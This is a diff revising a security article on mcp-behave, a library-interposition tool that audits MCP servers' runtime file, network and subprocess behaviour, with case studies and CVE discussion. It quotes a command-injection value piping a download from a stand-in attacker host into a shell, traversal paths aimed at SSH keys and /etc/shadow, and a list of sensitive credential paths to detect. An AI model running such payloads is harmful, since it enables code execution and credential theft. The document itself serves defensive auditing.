@@ -1,6 +1,6 @@
 # Auditing Real-World MCP Servers with `mcp-behave`: A Ground-Truth Comparative Study
 
-*Why Static Registry Scanners Fail and How Dynamic Syscall Auditing Catches the Lie in Production Model Context Protocol Servers*
+*Why Static Registry Scanners Are Blind to Runtime Behavior and How Dynamic Library Interposition Observes Unconstrained Shell Access and Network Egress in Production Model Context Protocol Servers*
 
 **By Navid Mirnouri**  
 *November 2026*
@@ -13,14 +13,15 @@ The **Model Context Protocol (MCP)** has rapidly emerged as the universal standa
 
 As thousands of open-source MCP servers flood registries like PyPI, npm, Glama, Smithery, and the official MCP Registry, a dangerous security assumption has become standard practice: **if a tool's JSON schema and description look benign, the tool is safe to install.**
 
-Today, MCP server verification relies overwhelmingly on **static schema analysis**. Registries evaluate description clarity, parameter type hints, JSON-schema constraints, and metadata completeness. But static scanners suffer from a catastrophic blind spot: **they only read what the server *declares*, never what it *actually does*.**
+Today, MCP server verification relies overwhelmingly on **static schema analysis**. Registries evaluate description clarity, parameter type hints, JSON-schema constraints, and metadata completeness. But static scanners suffer from a critical visibility gap: **they only read what the server *declares*, never what it *actually does* at runtime.**
 
-In this experiment, we put this assumption to the test on **real-world, publicly published MCP servers from the wild** using **`mcp-behave`**, an open-source runtime behavioral auditor. We evaluate:
+In this experiment, we put this assumption to the test on **real-world, publicly published MCP servers from the wild** using **`mcp-behave`**, an open-source runtime behavioral auditor using user-space dynamic library interposition. We evaluate:
 
 1. **The Safe Baseline**: `mcp-server-time` (Anthropic's official time server on PyPI).
-2. **The High-Risk Privileged Target**: `mcp-server-shell` (a published PyPI server that executes host commands via `subprocess.run(shell=True)`), evaluated alongside `mcp-server-fetch` (testing dynamic outbound network socket interception).
+2. **Privileged Host Capability**: `mcp-server-shell` (a published PyPI server that executes host commands via `subprocess.run(shell=True)`).
+3. **Expected Network Egress**: `mcp-server-fetch` (testing dynamic outbound network socket observation).
 
-Through non-invasive runtime dynamic tracing (via macOS `DYLD_INSERT_LIBRARIES` and Linux `LD_PRELOAD`), `mcp-behave` captures the exact system calls issued by each server during autonomous canary probing. We present the ground-truth results, analyze real-world vulnerabilities like **CVE-2025-54073** and **CVE-2025-53110**, and outline why runtime behavioral auditing must become standard in agentic pipelines.
+Through non-invasive runtime dynamic tracing (via macOS `DYLD_INSERT_LIBRARIES` and Linux `LD_PRELOAD`), `mcp-behave` captures the exact system calls issued by each server during autonomous canary probing. We present the ground-truth results, analyze how runtime tracing informs investigation of known vulnerability classes like **CVE-2025-54073** and **CVE-2025-53110**, and outline why runtime behavioral auditing must become standard in agentic pipelines.
 
 ---
 
@@ -39,31 +40,13 @@ When a developer configures an MCP server in Claude Desktop, Cursor, or an auton
 }
 ```
 
-That process does not run in an isolated browser sandbox or restricted hypervisor by default. **It executes locally with the developer's full user account privileges.** It inherits the developer's `$HOME`, SSH keys in `~/.ssh`, cloud credentials in `~/.aws/credentials`, environment secrets (`.env`), and access to local network interfaces.
+That process does not run in an isolated browser sandbox or restricted hypervisor by default. **It executes locally with the developer's full operating system user account privileges.** It inherits the developer's `$HOME`, SSH keys in `~/.ssh`, cloud credentials in `~/.aws/credentials`, environment secrets (`.env`), and access to local network interfaces.
 
 In the MCP specification, servers communicate over JSON-RPC (standard input/output or HTTP/SSE):
 - `tools/list`: Declares available tools, human-readable descriptions, and JSON Schemas.
 - `tools/call`: Dispatches a tool execution request with arguments supplied by the LLM.
 
-### Why Static Schema Auditing Fails
-
-Consider two MCP tools declared in a registry:
-
-```json
-/* Tool A: Claiming safe offline operation */
-{
-  "name": "calculate_hash",
-  "description": "Computes SHA-256 hash of a string. Completely local and offline.",
-  "inputSchema": { "type": "object", "properties": { "text": { "type": "string" } } }
-}
-
-/* Tool B: Host execution helper */
-{
-  "name": "execute_command",
-  "description": "Execute a shell command and return its output",
-  "inputSchema": { "type": "object", "properties": { "command": { "type": "string" } } }
-}
-```
+### Why Static Schema Auditing Is Incomplete
 
 Static scanners inspect the AST or the JSON manifest. They check whether types are valid and whether descriptions match conventions. However:
 
@@ -75,32 +58,34 @@ To verify trust, we must observe ground-truth execution.
 
 ---
 
-## 2. Architecture of `mcp-behave`
+## 2. Architecture of `mcp-behave`: Dynamic Library Interposition
 
 `mcp-behave` is designed as a zero-dependency, non-invasive runtime auditor that treats any MCP server as a black box.
 
 ```mermaid
 flowchart TD
-    CMD["Real MCP Server Command<br/>(e.g., mcp-server-time, mcp-server-shell)"] --> INJECT["Runtime Syscall Interposition<br/>(macOS DYLD / Linux LD_PRELOAD)"]
+    CMD["Real MCP Server Command<br/>(e.g., mcp-server-time, mcp-server-shell)"] --> INJECT["Runtime Dynamic Library Interposition<br/>(macOS DYLD / Linux LD_PRELOAD)"]
     INJECT --> ENGINE["Autonomous Probing Engine"]
     ENGINE --> DISCOVER["Query tools/list & resources/list"]
-    DISCOVER --> SYNTH["Schema-Aware Canary Synthesis<br/>(RFC-reserved domains, safe defaults)"]
+    DISCOVER --> SYNTH["Schema-Aware Canary Synthesis<br/>(RFC-reserved domains, min constraints, defaults)"]
     SYNTH --> EXERCISE["Dispatch tools/call over stdio"]
     EXERCISE --> SINK["Intercept libc Calls to trace.log<br/>(F=open, N=connect, X=exec/posix_spawn)"]
     SINK --> ANALYZE["Differential Policy Analyzer<br/>(Declared vs. Observed Behavior)"]
-    ANALYZE --> REPORT["Audit Verdict & Findings<br/>(Exit Code 0 vs Exit Code > 0)"]
+    ANALYZE --> REPORT["Audit Verdict & Behavioral Profile<br/>(Exit Code 0 vs Exit Code > 0)"]
 ```
 
-### Key Technical Pillars
+### Technical Foundations and Boundaries
 
-1. **Non-Invasive Syscall Interposition (No Root Required)**:
-   - On **macOS**, `mcp-behave` injects `libmcpbehave_trace.dylib` via `DYLD_INSERT_LIBRARIES`, interposing `open`, `openat`, `connect`, `execve`, `execv`, and `posix_spawn`.
-   - On **Linux**, it injects `libmcpbehave_trace.so` via `LD_PRELOAD` (with fallback to `strace`).
+1. **Non-Invasive C Library Interposition (User-Space, No Root Required)**:
+   - On **macOS**, `mcp-behave` injects `libmcpbehave_trace.dylib` via `DYLD_INSERT_LIBRARIES`, interposing standard dynamic library entry points: `open`, `openat`, `connect`, `execve`, `execv`, and `posix_spawn`.
+   - On **Linux**, it injects `libmcpbehave_trace.so` via `LD_PRELOAD` (with fallback to `strace` when available).
    - The trace sink writes directly to a private descriptor (`$MCP_BEHAVE_TRACE_FILE`), ensuring stdout remains purely dedicated to JSON-RPC traffic.
-2. **Schema-Aware Canary Synthesis**:
+2. **Architectural Scope & Limitations**:
+   - Because `mcp-behave` operates via dynamic library interposition, it intercepts calls made through standard dynamically linked C libraries (which covers mainstream Python, Node.js, and Ruby interpreters). It does *not* intercept direct inline kernel syscalls or statically compiled binaries that bypass libc entirely unless run with the Linux `strace` backend.
+3. **Schema-Aware Canary Synthesis**:
    - Instead of static mock testing, `mcp-behave` reads each tool's JSON Schema at runtime.
    - It synthesizes valid arguments respecting `format` (URIs, emails, dates), `minimum` constraints, and schema `default` values, injecting canary identifiers (`canary-input`, `http://example.com/`, `/tmp/probe-canary.txt`).
-3. **Differential Scope Analysis**:
+4. **Differential Scope Analysis**:
    - **Network Egress**: Detects outbound TCP/UDP `connect()` calls. If a tool claims "local" or "offline" in its description, undeclared egress is flagged as **HIGH** severity.
    - **Sensitive File Access**: Detects accesses to credential stores (`~/.ssh`, `id_rsa`, `.env`, `.aws/credentials`, `.kube`, `/etc/shadow`).
    - **Subprocess Spawns**: Detects host process creation (`/bin/sh`, `git`, external binaries).
@@ -167,32 +152,11 @@ F /var/db/zoneinfo
 
 ---
 
-### Experiment B: Auditing the High-Risk Shell Server (`mcp-server-shell`)
+### Experiment B: Privileged Host Capability (`mcp-server-shell`)
 
 `mcp-server-shell` (published on PyPI: `mcp-server-shell==0.1.0`) is a package intended to give models terminal access.
 
-#### Declared Manifest
-
-The server advertises a single tool:
-
-```json
-{
-  "name": "execute_command",
-  "description": "Execute a shell command and return its output",
-  "inputSchema": {
-    "type": "object",
-    "properties": {
-      "command": {
-        "type": "string",
-        "description": "Shell command to execute"
-      }
-    },
-    "required": ["command"]
-  }
-}
-```
-
-#### Underlying Implementation
+#### Implementation
 
 Inspection of `server.py` in the package source reveals:
 
@@ -211,7 +175,13 @@ class ShellServer:
 
 The server passes the tool argument directly to Python's `subprocess.run(command, shell=True)`.
 
-#### Execution under `mcp-behave`
+#### Security Nuance: Capability vs. Malice
+
+Here, an important security distinction is necessary:
+
+**Spawning `/bin/sh` is not an exploit; it is the tool's advertised function.** The tool explicitly advertises that it executes shell commands, and it uses Python's standard `subprocess.run(shell=True)` to fulfill that contract.
+
+However, from a security architecture perspective, running `mcp-behave` against this live package observes the true privilege tier of the server:
 
 ```bash
 mcp-behave /tmp/audit_env/bin/python -m mcp_server_shell
@@ -249,15 +219,13 @@ X /bin/sh
 ```
 
 - **Observed Behavior**: The server spawned `/bin/sh` to interpret the command.
-- **Security Assessment**: `execute_command` exposes an unconstrained shell on the host OS. When connected to an LLM agent, this tool transforms any prompt injection vulnerability (direct or indirect) into full Remote Code Execution (RCE) on the developer's workstation.
+- **Security Assessment**: `execute_command` exposes an unconstrained shell on the host OS. Spawning `/bin/sh` is consistent with its declared functionality, but the absence of an authorization or sandboxing boundary means that if an autonomous agent with access to this tool processes untrusted external input (such as an indirect prompt injection in a README or webpage), this privileged capability can be invoked with arbitrary payloads.
 
 ---
 
-### Experiment C: Auditing Network Egress in `mcp-server-fetch`
+### Experiment C: Expected Network Egress (`mcp-server-fetch`)
 
-To verify dynamic network socket tracing against production code, we audited `mcp-server-fetch` (Anthropic Official, v2026.11.11).
-
-#### Execution
+To evaluate network observation against production code, we audited `mcp-server-fetch` (Anthropic Official, v2026.11.11).
 
 ```bash
 mcp-behave /tmp/audit_env/bin/mcp-server-fetch --no-readability-js
@@ -284,13 +252,18 @@ HTTP Request: GET http://example.com/ "HTTP/1.1 200 OK"
   [i] INFO network egress to 172.66.147.243:80
 ```
 
-`mcp-behave`'s tracer caught the live `connect()` syscall to remote IP `172.66.147.243:80`, proving that dynamic tracing captures outbound network egress without requiring DNS query inspection or network packet capture tools.
+**Context**: Fetching websites is exactly what `mcp-server-fetch` is designed to do. Outbound socket connection to `172.66.147.243:80` is expected behavior, not suspicious activity.
+
+The experiment proves **observational fidelity**: the tracer intercepted the dynamic libc `connect()` call to remote socket `172.66.147.243:80`. This provides the foundation for future policy enforcement:
+- Distinguishing expected egress (public domain requested by probe).
+- Detecting unexpected egress (tools claiming offline operation).
+- Verifying protection against restricted destinations (e.g. cloud metadata services `169.254.169.254` or private RFC 1918 subnets).
 
 ---
 
-## 4. Comparison Matrix: Real-World Server Audits
+## 4. Comparison Matrix: Observed Runtime Profiles
 
-| Dimension | `mcp-server-time` (Safe) | `mcp-server-fetch` (Privileged) | `mcp-server-shell` (High-Risk) |
+| Dimension | `mcp-server-time` | `mcp-server-fetch` | `mcp-server-shell` |
 | :--- | :--- | :--- | :--- |
 | **Origin / Source** | Anthropic Official (PyPI) | Anthropic Official (PyPI) | Community (PyPI) |
 | **Declared Purpose** | Date & Time conversions | Web page retrieval & Markdown conversion | Shell command execution |
@@ -298,31 +271,30 @@ HTTP Request: GET http://example.com/ "HTTP/1.1 200 OK"
 | **Observed File Opens** | 572 total (7 OS zoneinfo paths) | 610 total (HTTP/SSL cert stores) | 593 total (system plists) |
 | **Observed Network Egress** | **0 sockets** | **1 socket** (`172.66.147.243:80`) | **0 sockets** |
 | **Observed Subprocesses** | **0** | **0** | **1 host shell (`/bin/sh`)** |
-| **Sensitive File Access** | **None** | **None** | **Arbitrary via input command** |
-| **Blast Radius** | Zero (In-memory date math) | Network (SSRF / Internal IP egress if unconstrained) | Complete Workstation Compromise |
-| **mcp-behave Verdict** | Clean Baseline (Exit 0) | Behavioral Info (Exit 0) | Subprocess Alerted |
+| **Privilege Tier** | Contained (In-memory computation) | Network Egress (Outbound HTTP) | Host Subprocess Execution |
+| **mcp-behave Verdict** | Clean Baseline (Exit 0) | Expected Egress Observed (Exit 0) | Privileged Capability Observed (Exit 0) |
 
 ---
 
-## 5. Real-World CVE Analysis in the MCP Ecosystem
+## 5. How Runtime Tracing Can Help Investigate Known MCP Vulnerability Classes
 
-The risks demonstrated by `mcp-server-shell` are not theoretical. As MCP adoption surged across 2025 and 2026, severe real-world vulnerabilities were uncovered in published MCP packages:
+The behavioral patterns surfaced above directly illuminate two major vulnerability classes that emerged in published MCP packages during 2025 and 2026. While the specific exploits below were not executed in our control run, examining their mechanics demonstrates how runtime behavioral observation complements static linting:
 
-### 1. CVE-2025-54073: Remote Code Execution in `mcp-package-docs` (npm)
-- **Vulnerability**: An MCP server designed to fetch documentation for package managers passed package names directly into `child_process.exec()`.
-- **Exploitation**: An attacker crafting a malicious documentation prompt or an indirect injection payload in a README could supply `react; curl attacker.com/sh | sh`, resulting in arbitrary command execution.
-- **Why Static Scanners Missed It**: The tool schema simply declared `package_name: string`. The static scanner saw valid metadata.
-- **How `mcp-behave` Detects It**: Autonomous argument synthesis executes the tool, and the tracer records the `execve` / `posix_spawn` call to `/bin/sh`, exposing the unconstrained subprocess launch immediately.
+### Vulnerability Class A: Command Injection (e.g., CVE-2025-54073 in `mcp-package-docs`)
+- **The Flaw**: In `mcp-package-docs` (npm), unsanitized user inputs were concatenated directly into shell arguments passed to Node's `child_process.exec()`. An attacker providing a package name containing shell metacharacters (e.g. `react; curl attacker.com/sh | sh`) achieved arbitrary command execution.
+- **Static Scanner Limitation**: The tool manifest declared `package_name: string`. AST linters saw standard type annotations and a legitimate tool description. Nothing in the schema indicated dangerous behavior.
+- **Runtime Tracing Contribution**: In an audit environment, dynamic library interposition intercepts `posix_spawn` or `execve` calls. When an execution probe sends synthetic metacharacter sequences, the immediate appearance of `/bin/sh` executing secondary binaries provides an unambiguous signal of command concatenation before deployment.
 
-### 2. CVE-2025-53110: Path Traversal in Filesystem MCP Servers
-- **Vulnerability**: Path traversal flaws allowed LLMs to bypass configured directory roots (e.g. using `../../../../etc/shadow` or `../../.ssh/id_rsa`).
-- **How `mcp-behave` Detects It**: `mcp-behave` plants canary markers and monitors every `open()` call against a list of sensitive paths (`.ssh`, `id_rsa`, `.aws/credentials`, `.env`, `/etc/shadow`). If any sensitive path is opened, a **HIGH** severity finding is triggered automatically.
+### Vulnerability Class B: Path Traversal (e.g., CVE-2025-53110 in Filesystem MCP)
+- **The Flaw**: Path validation logic in directory prefix matching allowed attackers to access files outside the allowed directory when two directory names shared common prefixes (e.g. `/workspace_allowed` vs `/workspace_allowed_secret`), or via relative traversal sequences.
+- **Static Scanner Limitation**: The tool declared standard file management functions (`read_file`, `write_file`) with valid string paths.
+- **Runtime Tracing Contribution**: `mcp-behave` monitors every `open()` and `openat()` libc call against both the declared workspace root and a curated list of sensitive credential paths (`~/.ssh`, `id_rsa`, `.aws/credentials`, `.env`, `/etc/shadow`). When canary probes attempt path traversal, any libc read targeting a sensitive file triggers an immediate **HIGH** severity alert.
 
 ---
 
 ## 6. Implementation Deep-Dive: Intercepting Subprocesses on Modern OSes
 
-During our testing of real servers on macOS Apple Silicon, we encountered a subtle engineering hurdle in tracing Python subprocesses that is crucial for security tool authors:
+During our testing of real servers on macOS Apple Silicon, we encountered a subtle engineering hurdle in tracing Python subprocesses:
 
 When Python invokes `subprocess.run(shell=True)`:
 1. Python calls `_posixsubprocess.fork_exec()`.
@@ -332,7 +304,7 @@ When Python invokes `subprocess.run(shell=True)`:
 
 ### The Fix in `macos_tracer.c`
 
-To ensure zero dropped events across child forks, `mcp-behave` detects descriptor invalidation and re-opens the trace log with atomic append semantics:
+To improve trace reliability across child forks, `mcp-behave` detects descriptor invalidation and re-opens the trace log with atomic append semantics:
 
 ```c
 static void emit(const char *buf, size_t len) {
@@ -356,27 +328,23 @@ static void emit(const char *buf, size_t len) {
 }
 ```
 
-This ensures that every subprocess spawned by any runtime (Python, Node.js, Go, Rust) is recorded with ground-truth fidelity.
+This significantly improves subprocess-event reliability when child processes close inherited trace descriptors before execution. For standard dynamically linked runtimes (Python, Node.js) that execute subprocesses via libc's `posix_spawn`, `execve`, or `execv`, atomic reopening ensures that fork-and-exec sequences are faithfully logged without losing records to `EBADF`.
 
 ---
 
-## 7. Strategic Recommendations for the MCP Ecosystem
+## 7. Evolution: From Behavior Observer to Security Policy Platform
 
-### For MCP Registry Operators (Glama, Smithery, Official Registry)
-1. **Mandate Dynamic Audits in Ingestion Pipelines**: Stop relying solely on schema linter badges. Run every submitted server under an automated behavioral auditor like `mcp-behave` before publishing.
-2. **Behavioral Badging**: Display empirical facts on registry listings:
-   - *Verified 0 network sockets*
-   - *Verified no subprocess execution*
-   - *Verified filesystem boundary enforcement*
-3. **Rug-Pull Monitoring**: Store cryptographic fingerprints (`manifest_sha256`) of each version's tool surface and alert users if a minor version update adds dangerous tools.
+| Capability Area | mcp-behave Today (Observer) | Next Phase (Policy Platform) |
+| :--- | :--- | :--- |
+| **Filesystem** | Detects and filters libc `open()` calls; alerts on sensitive paths | Enforces strict directory boundary policies per tool |
+| **Network** | Detects outbound `connect()` IP/port; alerts if claimed offline | Evaluates domain and CIDR allowlists; blocks private IP egress |
+| **Execution** | Detects subprocess launches (`/bin/sh`, binaries) | Enforces sandboxing profiles (e.g. seatbelt / landlock / bubblewrap) |
+| **Integrity** | Computes SHA-256 manifest hashes to catch rug-pulls across runs | Continuous registry verification and automated regression diffs |
 
-### For Developers & Enterprises Using MCP
-1. **Never Run Unaudited MCP Servers on Bare Metal**: Treat third-party MCP servers with the same caution as arbitrary binaries.
-2. **Audit in CI/CD**: Integrate `mcp-behave` into CI pipelines using the `--json` flag:
-   ```bash
-   mcp-behave --json --fail-on high my_mcp_server
-   ```
-3. **Principle of Least Privilege**: If an agent only needs date utilities, verify with `mcp-behave` that the server does not dial out or spawn shells.
+### Actionable Guidance
+1. **For MCP Registry Operators (Glama, Smithery, Official Registry)**: Mandate dynamic behavioral audits in ingestion pipelines. Ground badges in empirical facts: *0 network sockets observed*, *0 subprocesses spawned*, *strict path isolation verified*.
+2. **For Developers & Enterprises Using MCP**: Never run unaudited third-party MCP servers on bare metal with access to unconstrained shell execution without sandbox boundaries. Integrate `mcp-behave` in CI/CD using the `--json` flag.
+3. **For MCP Authors**: Implement explicit sandboxes, avoid raw shell expansion, and declare network requirements transparently in server metadata.
 
 ---
 
@@ -384,9 +352,9 @@ This ensures that every subprocess spawned by any runtime (Python, Node.js, Go, 
 
 The Model Context Protocol gives AI agents extraordinary superpowers, but also grants third-party code direct access to our development environments.
 
-Static schema inspection is fundamentally insufficient: it guarantees syntactic correctness, but says nothing about runtime honesty. As demonstrated by our audits of `mcp-server-time`, `mcp-server-fetch`, and `mcp-server-shell`, **runtime behavioral tracing with `mcp-behave` provides the empirical ground-truth required to separate safe, well-behaved tools from high-risk, unconstrained execution vectors.**
+Static schema inspection is fundamentally incomplete: it guarantees syntactic correctness, but says nothing about runtime honesty. As demonstrated by our audits of `mcp-server-time`, `mcp-server-fetch`, and `mcp-server-shell`, **runtime behavioral tracing with dynamic library interposition provides the empirical ground-truth required to separate safe, well-behaved tools from high-privilege execution vectors.**
 
-Before connecting your next MCP server to Claude Desktop or Cursor, don't just read the schema. **Audit what it actually does.**
+Before connecting your next MCP server to Claude Desktop or Cursor, don't just read the schema. **Observe what it actually does.**
 
 ---
 
